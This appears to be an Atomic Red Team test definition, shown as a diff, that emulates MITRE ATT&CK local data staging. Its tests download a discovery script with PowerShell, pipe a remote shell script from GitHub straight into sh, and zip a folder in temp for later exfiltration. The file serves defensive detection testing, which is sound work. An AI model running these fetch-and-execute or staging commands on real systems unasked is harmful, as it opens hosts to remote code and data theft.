@@ -1,0 +1,69 @@
+attack_technique: T1074.001
+display_name: 'Data Staged: Local Data Staging'
+atomic_tests:
+- name: Stage data from Discovery.bat
+  auto_generated_guid: 107706a5-6f9f-451a-adae-bab8c667829f
+  description: |
+    Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
+    verify that the file is saved in the temp directory.
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Location to save downloaded discovery.bat file
+      type: path
+      default: $env:TEMP\discovery.bat        
+  executor:
+    command: |
+      Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile #{output_file}
+    cleanup_command: |
+      Remove-Item -Force #{output_file} -ErrorAction Ignore
+    name: powershell
+- name: Stage data from Discovery.sh
+  auto_generated_guid: 39ce0303-ae16-4b9e-bb5b-4f53e8262066
+  description: |
+    Utilize curl to download discovery.sh and execute a basic information gathering shell script
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    output_file:
+      description: Location to save downloaded discovery.bat file
+      type: path
+      default: /tmp/T1074.001_discovery.log
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Check if curl is installed on the machine.
+    prereq_command: |
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
+  executor:
+    command: |
+      curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}
+    cleanup_command: |
+      rm #{output_file}
+    name: sh
+- name: Zip a Folder with PowerShell for Staging in Temp
+  auto_generated_guid: a57fbe4b-3440-452a-88a7-943531ac872a
+  description: |
+    Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
+    was placed in the temp directory.
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Location to save zipped file or folder
+      type: path
+      default: $env:TEMP\Folder_to_zip.zip
+    input_file:
+      description: Location of file or folder to zip
+      type: path
+      default: PathToAtomicsFolder\T1074.001\bin\Folder_to_zip
+  executor:
+    command: |
+      Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
+    cleanup_command: |
+      Remove-Item -Path #{output_file} -ErrorAction Ignore
+    name: powershell
